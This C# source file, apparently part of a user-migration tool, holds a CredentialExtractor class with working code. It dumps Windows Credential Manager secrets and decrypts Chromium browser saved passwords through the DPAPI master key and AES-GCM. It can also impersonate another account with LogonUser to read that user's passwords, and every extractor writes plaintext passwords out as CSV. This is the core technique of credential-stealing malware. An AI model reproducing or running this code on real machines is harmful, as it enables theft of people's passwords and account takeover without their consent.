using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Security.Principal;

namespace HMTUserMoveNative
{
    public class UIHelpers 
    {
        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
        [DllImport("dwmapi.dll")] public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
    }

    public class CredentialExtractor
    {
        // --- Windows Credential Manager ---
        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern void CredFree(IntPtr buffer);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CREDENTIAL
        {
            public int flags;
            public int type;
            public IntPtr targetName;
            public IntPtr comment;
            public long lastWritten;
            public int credentialBlobSize;
            public IntPtr credentialBlob;
            public int persist;
            public int attributeCount;
            public IntPtr attributes;
            public IntPtr targetAlias;
            public IntPtr userName;
        }

        public static string GetWindowsCredentialsCsv()
        {
            IntPtr pCredentials;
            int count;
            bool success = CredEnumerate(null, 1, out count, out pCredentials);
            
            if (!success) return "Target,Username,Password\nError," + Marshal.GetLastWin32Error() + ",Failed";

            StringBuilder csv = new StringBuilder();
            csv.AppendLine("Target,Username,Password");

            IntPtr[] credPointers = new IntPtr[count];
            Marshal.Copy(pCredentials, credPointers, 0, count);

            for (int i = 0; i < count; i++)
            {
                CREDENTIAL cred = (CREDENTIAL)Marshal.PtrToStructure(credPointers[i], typeof(CREDENTIAL));
                string target = Marshal.PtrToStringUni(cred.targetName) ?? "";
                string user = Marshal.PtrToStringUni(cred.userName) ?? "";
                string password = "";
                
                if (cred.credentialBlob != IntPtr.Zero && cred.credentialBlobSize > 0)
                {
                    byte[] blob = new byte[cred.credentialBlobSize];
                    Marshal.Copy(cred.credentialBlob, blob, 0, cred.credentialBlobSize);
                    password = Encoding.Unicode.GetString(blob);
                }

                target = target.Replace("\"", "\"\"");
                user = user.Replace("\"", "\"\"");
                password = password.Replace("\"", "\"\"");
                password = password.Replace("\0", "");

                if (!string.IsNullOrWhiteSpace(target) && !string.IsNullOrWhiteSpace(password))
                    csv.AppendLine($"\"{target}\",\"{user}\",\"{password}\"");
            }
            CredFree(pCredentials);
            return csv.ToString();
        }

        // --- Chromium DPAPI Decryption ---
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText, ref string pszDescription, ref DATA_BLOB pEntropy, IntPtr pReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPrompt, int dwFlags, ref DATA_BLOB pPlainText);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct CRYPTPROTECT_PROMPTSTRUCT
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        private static byte[] DPAPIDecrypt(byte[] cipherTextBytes)
        {
            DATA_BLOB plainTextBlob = new DATA_BLOB();
            DATA_BLOB cipherTextBlob = new DATA_BLOB();
            DATA_BLOB entropyBlob = new DATA_BLOB();
            CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
            prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
            prompt.dwPromptFlags = 0;
            prompt.hwndApp = IntPtr.Zero;
            prompt.szPrompt = null;
            string emptyString = string.Empty;

            try
            {
                cipherTextBlob.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                cipherTextBlob.cbData = cipherTextBytes.Length;
                Marshal.Copy(cipherTextBytes, 0, cipherTextBlob.pbData, cipherTextBytes.Length);

                bool success = CryptUnprotectData(ref cipherTextBlob, ref emptyString, ref entropyBlob, IntPtr.Zero, ref prompt, 0, ref plainTextBlob);
                if (success)
                {
                    byte[] plainTextBytes = new byte[plainTextBlob.cbData];
                    Marshal.Copy(plainTextBlob.pbData, plainTextBytes, 0, plainTextBlob.cbData);
                    return plainTextBytes;
                }
            }
            finally
            {
                if (cipherTextBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(cipherTextBlob.pbData);
                if (plainTextBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(plainTextBlob.pbData);
            }
            return null;
        }

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        public static extern bool LogonUser(String lpszUsername, String lpszDomain, String lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public extern static bool CloseHandle(IntPtr handle);

        public static string GetChromiumPasswordsCsv(string localStatePath, string loginDataPath, string sqliteDllPath)
        {
            return ExecuteChromiumExtraction(localStatePath, loginDataPath, sqliteDllPath);
        }

        public static string GetChromiumPasswordsImpersonated(string localStatePath, string loginDataPath, string sqliteDllPath, string domain, string username, string password)
        {
            IntPtr tokenHandle = new IntPtr(0);
            try
            {
                // LOGON32_LOGON_INTERACTIVE = 2, LOGON32_PROVIDER_DEFAULT = 0
                bool returnValue = LogonUser(username, domain, password, 2, 0, out tokenHandle);
                if (!returnValue)
                {
                    return "URL,Username,Password\nError,LogonUser Failed: " + Marshal.GetLastWin32Error() + ",";
                }

                using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(tokenHandle))
                {
                    return ExecuteChromiumExtraction(localStatePath, loginDataPath, sqliteDllPath);
                }
            }
            catch (Exception ex)
            {
                return "URL,Username,Password\nError,Impersonation Exception: " + ex.Message.Replace("\n", " ") + ",";
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero) CloseHandle(tokenHandle);
            }
        }

        private static string ExecuteChromiumExtraction(string localStatePath, string loginDataPath, string sqliteDllPath)
        {
            if (!File.Exists(localStatePath) || !File.Exists(loginDataPath) || !File.Exists(sqliteDllPath))
                return "URL,Username,Password\nError,Missing Files,";

            try
            {
                // 1. Get DPAPI Master Key from Local State
                string localStateContent = File.ReadAllText(localStatePath);
                Match match = Regex.Match(localStateContent, "\"os_crypt\":{\"encrypted_key\":\"([^\"]+)\"");
                if (!match.Success) return "URL,Username,Password\nError,No encrypted_key found,";

                byte[] encryptedKeyBytes = Convert.FromBase64String(match.Groups[1].Value);
                // Remove the "DPAPI" prefix (first 5 bytes)
                byte[] dpapiKey = new byte[encryptedKeyBytes.Length - 5];
                Array.Copy(encryptedKeyBytes, 5, dpapiKey, 0, encryptedKeyBytes.Length - 5);
                byte[] masterKey = DPAPIDecrypt(dpapiKey);
                if (masterKey == null) return "URL,Username,Password\nError,DPAPI Decrypt Failed,";

                // 2. Load SQLite DLL via Reflection
                Assembly sqliteAssembly = Assembly.LoadFile(sqliteDllPath);
                Type connectionType = sqliteAssembly.GetType("System.Data.SQLite.SQLiteConnection");
                Type commandType = sqliteAssembly.GetType("System.Data.SQLite.SQLiteCommand");
                Type readerType = sqliteAssembly.GetType("System.Data.SQLite.SQLiteDataReader");

                string tempDbPath = Path.Combine(Path.GetTempPath(), "temp_login_data.sqlite");
                File.Copy(loginDataPath, tempDbPath, true);

                StringBuilder csv = new StringBuilder();
                csv.AppendLine("URL,Username,Password");

                using (var conn = (IDisposable)Activator.CreateInstance(connectionType, $"Data Source={tempDbPath};Version=3;"))
                {
                    connectionType.GetMethod("Open").Invoke(conn, null);
                    using (var cmd = (IDisposable)Activator.CreateInstance(commandType, "SELECT origin_url, username_value, password_value FROM logins", conn))
                    {
                        var reader = commandType.GetMethod("ExecuteReader", new Type[0]).Invoke(cmd, null);
                        var readMethod = readerType.GetMethod("Read");
                        var getStringMethod = readerType.GetMethod("GetString", new[] { typeof(int) });
                        var getValueMethod = readerType.GetMethod("GetValue", new[] { typeof(int) });

                        while ((bool)readMethod.Invoke(reader, null))
                        {
                            string url = (string)getStringMethod.Invoke(reader, new object[] { 0 });
                            string user = (string)getStringMethod.Invoke(reader, new object[] { 1 });
                            byte[] encPass = (byte[])getValueMethod.Invoke(reader, new object[] { 2 });

                            string password = "";
                            if (encPass != null && encPass.Length > 15 && encPass[0] == 118 && encPass[1] == 10) // v10 prefix
                            {
                                byte[] iv = new byte[12];
                                Array.Copy(encPass, 3, iv, 0, 12);
                                byte[] cipherText = new byte[encPass.Length - 15 - 16]; // Exclude Prefix, IV, and AuthTag
                                Array.Copy(encPass, 15, cipherText, 0, cipherText.Length);
                                byte[] authTag = new byte[16];
                                Array.Copy(encPass, encPass.Length - 16, authTag, 0, 16);

                                using (AesGcm aesGcm = new AesGcm(masterKey))
                                {
                                    byte[] plainText = new byte[cipherText.Length];
                                    try
                                    {
                                        aesGcm.Decrypt(iv, cipherText, authTag, plainText);
                                        password = Encoding.UTF8.GetString(plainText);
                                    }
                                    catch { password = "DECRYPTION_FAILED"; }
                                }
                            }

                            url = url.Replace("\"", "\"\"");
                            user = user.Replace("\"", "\"\"");
                            password = password.Replace("\"", "\"\"");

                            if (!string.IsNullOrWhiteSpace(url) && !string.IsNullOrWhiteSpace(password))
                                csv.AppendLine($"\"{url}\",\"{user}\",\"{password}\"");
                        }
                    }
                }
                File.Delete(tempDbPath);
                return csv.ToString();
            }
            catch (Exception ex)
            {
                return "URL,Username,Password\nError," + ex.Message.Replace("\n", " ") + ",";
            }
        }
    }
}
